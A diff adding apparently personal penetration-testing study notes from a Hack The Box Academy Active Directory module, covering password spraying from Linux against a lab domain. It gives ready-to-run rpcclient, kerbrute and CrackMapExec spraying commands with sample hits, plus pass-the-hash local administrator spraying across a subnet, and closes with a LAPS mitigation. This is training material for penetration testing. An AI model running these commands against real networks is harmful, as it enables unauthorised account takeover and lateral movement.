@@ -706,4 +706,83 @@ With valid credentials, use any of the tools stated previously to build a user l
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
+# Internal Password Spraying - from Linux
+
+## Overview
+Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. This section focuses on performing password spraying from Linux hosts.
+
+## Using rpcclient
+Rpcclient is an excellent option for performing this attack from Linux. A valid login is indicated by the response "Authority Name". We can filter out invalid login attempts by grepping for "Authority" in the response.
+
+### Bash One-Liner for the Attack
+```shell
+for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+### Example Output
+```shell
+Account Name: tjohnson, Authority Name: INLANEFREIGHT
+Account Name: sgage, Authority Name: INLANEFREIGHT
+```
+
+## Using Kerbrute
+Kerbrute can also be used for the same attack.
+
+### Command
+```shell
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+### Example Output
+```shell
+[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
+Done! Tested 57 logins (1 successes) in 0.172 seconds
+```
+
+## Using CrackMapExec
+CrackMapExec accepts a text file of usernames to be run against a single password in a spraying attack. We grep for "+" to filter out logon failures and focus on valid login attempts.
+
+### Command
+```shell
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+
+### Example Output
+```shell
+SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
+```
+
+## Validating Credentials with CrackMapExec
+After getting hits with our password spraying attack, we can use CrackMapExec to validate the credentials quickly against a Domain Controller.
+
+### Command
+```shell
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+### Example Output
+```shell
+SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
+```
+
+## Local Administrator Password Reuse
+Internal password spraying is also possible with local administrator accounts. If you obtain the NTLM password hash or cleartext password for the local administrator account, this can be attempted across multiple hosts in the network.
+
+### Local Admin Spraying with CrackMapExec
+```shell
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+### Example Output
+```shell
+SMB 172.16.5.50 445 ACADEMY-EA-MX01 [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+SMB 172.16.5.25 445 ACADEMY-EA-MS01 [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+SMB 172.16.5.125 445 ACADEMY-EA-WEB0 [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+## Considerations
+- This technique is noisy and not suitable for stealthy assessments.
+- Highlight this issue during penetration tests, even if it is not part of the path to compromise the domain.
+- Use the free Microsoft tool Local Administrator Password Solution (LAPS) to manage local administrator passwords and enforce unique passwords on each host that rotate on a set interval.
+
 
